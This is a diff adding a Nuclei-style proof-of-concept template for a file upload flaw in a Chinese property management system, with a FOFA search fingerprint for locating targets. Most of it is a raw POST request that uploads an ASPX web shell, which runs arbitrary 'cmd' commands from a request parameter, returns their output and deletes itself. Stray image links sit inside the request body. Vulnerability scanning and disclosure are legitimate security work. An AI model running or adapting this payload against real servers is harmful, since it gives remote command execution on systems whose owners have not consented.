@@ -1,0 +1,79 @@
+id: poc-vfam969395l9kvln
+info:
+  name: 新视窗新一代物业管理系统 uploadfile.ashx 存在文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vfam969395l9kvln'
+  tags: file-upload,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: vfam969395l9kvln
+    fofa: body="BPMSite/ClientSupport/OCXInstall.aspx"
+http:
+- raw:
+  - 'POST /script/uploadify/uploadfile.ashx?id=1 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:153.0) Gecko/20100101 Firefox/153.0
+
+    Upgrade-Insecure-Requests: 1
+
+    Priority: u=0, i
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+    Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
+
+    Accept-Encoding: gzip, deflate
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryWQPGtgGbo1eMeYgQ
+
+
+    ------WebKitFormBoundaryWQPGtgGbo1eMeYgQ
+
+    Content-Disposition: form-data; name="Filedata" filename="1.aspx"
+
+    Content-Type: application/octet-stream
+
+
+    <%@ Page Language="Jscript" validateRequest="false" %>
+
+    <%
+
+    var c=new System.Diagnostics.ProcessStartInfo("cmd");
+
+    var e=new System.Diagnostics.Process();
+
+    var out:System.IO.StreamReader,EI:System.IO.StreamReader;
+
+    c.UseShellExecute=false;
+
+    c.RedirectStandardOutput=true;
+
+    c.RedirectStandardError=true;
+
+    e.StartInfo=c;
+
+    c.Arguments="/c " + Request.Item["cmd"];
+
+    e.Start();
+
+    out=e.StandardOutput;
+
+    EI=e.StandardError;
+
+    e.Close();
+
+    Response.Write(out.ReadToEnd() + EI.ReadToEnd());
+
+    System.IO.File.Delete(Request.PhysicalPath);
+
+    Response.End();%>
+
+    ------WebKitFormBoundaryWQPGtgGbo1eMeYgQ--![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1787582720522-2bec38ff-d7f9-45d0-b64e-762c20a5e6d7.png)![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1787582720883-e6204eb7-9c17-4c61-9fed-5d0c65a16a45.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
